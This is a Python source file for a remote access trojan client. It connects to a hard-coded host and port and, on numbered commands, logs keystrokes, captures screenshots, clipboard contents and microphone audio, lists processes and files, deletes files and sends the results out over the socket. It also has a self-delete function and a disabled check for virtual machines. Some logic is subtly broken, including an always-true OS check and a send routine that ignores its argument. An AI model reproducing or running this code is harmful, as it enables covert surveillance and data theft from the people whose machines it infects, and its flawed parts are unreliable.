import socket
import platform
import os
import os.path
import datetime
from pynput.keyboard import Listener
import pyscreenshot
import pyperclip
import sounddevice
from scipy.io.wavfile import write
from threading import *
import pyautogui

ip = "192.168.0.4"
port = 4444
sockClie = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def virtEnv():
    check = platform.platform()
    if "Linux" in check or "linux":
        res1 = os.popen("cat /sys/class/dmi/id/product_name")
    elif "Windows" in check:
        res1 = os.popen("systeminfo")
    else:
        res1 = ""
    r = res1.read().replace('\n', ' ')
    if r.find("VirtualBox") == 0 or r.find("VBOX") == 0 or r.find("VMware") == 0:
        return True
    return False

class Keylogger:
    def on_press(self, key):
        sockClie.send(str(key).encode())

def file(photo):
    file = open(r'Screen.png', "rb")
    image_data = file.read(2048)
    while image_data:
        sockClie.send(image_data)
        image_data = file.read(2048)

    file.close()
    """fd = open(photo, 'rb')
    if fd is not None:
        fileData = fd.read()
        length = fileData
        sockClie.send(str(len(length)).encode)
        if int(sockClie.recv(1024).decode()) == len(length):
            sockClie.send(fileData)
    fd.close()"""

def keyLog():
    global listener
    with Listener(on_press=obj.on_press) as listener:
        listener.join()

def procEnumeration():
    check = platform.platform()
    if "Linux" in check or "linux":
        tasklist = os.popen('tasklist')
    currentProc = tasklist.read()
    sockClie.send(currentProc.encode())

def systemInformation():
    os_info = platform.platform() + " " + platform.machine() + " " + platform.node()
    sockClie.send(os_info.encode())

def dirFile():
    fs_info = ""
    for i in os.listdir():
        if(os.path.isfile(i)):
            fs_info += ' '
        else:
            fs_info += 'd '
        fs_info += str(datetime.datetime.fromtimestamp(int(os.path.getctime(i)))) + ' '
        fs_info += i + '\n'
    sockClie.send(fs_info.encode())

def fileDelete():
    filename = sockClie.recv(1024).decode()
    if os.path.isfile(filename):
        os.remove(filename)

def delMyself():
    os.remove(r'client_B.py')

def sShot():
    Screen_name = r'Screen.png'
    image = pyscreenshot.grab()
    image.save(Screen_name)
    file(Screen_name)

def clipboard():
    some_data = pyperclip.paste()
    sockClie.send(some_data.encode())

def recAudio():
    duration = 10
    fs = 44100
    audio_file = "Audio.wav"
    myarray = sounddevice.rec(int(duration*fs), samplerate=fs, channels=2)
    sounddevice.wait()
    write(audio_file, fs, myarray)
    file(audio_file)

#if virtEnv():
if __name__ == "__main__":
    sockClie.connect((ip, port))
    while True:
        while True:
            data = sockClie.recv(1024)
            if data:
                break
        if data.decode() == "2":
            break
        if data.decode() == "3":
            obj = Keylogger()
            keyLogTread = Thread(target=keyLog)
            keyLogTread.start()
        if data.decode() == "4":
            listener.stop()
            del obj
        if data.decode() == "5":
            procEnumeration()
        if data.decode() == "6":
            systemInformation()
        if data.decode() == "7":
            dirFile()
        if data.decode() == "8":
            fileDelete()
        if data.decode() == "9":
            sShot()
        if data.decode() == "10":
            clipboard()
        if data.decode() == "11":
            recAudio()
#else:
#    print("World in a shell")



















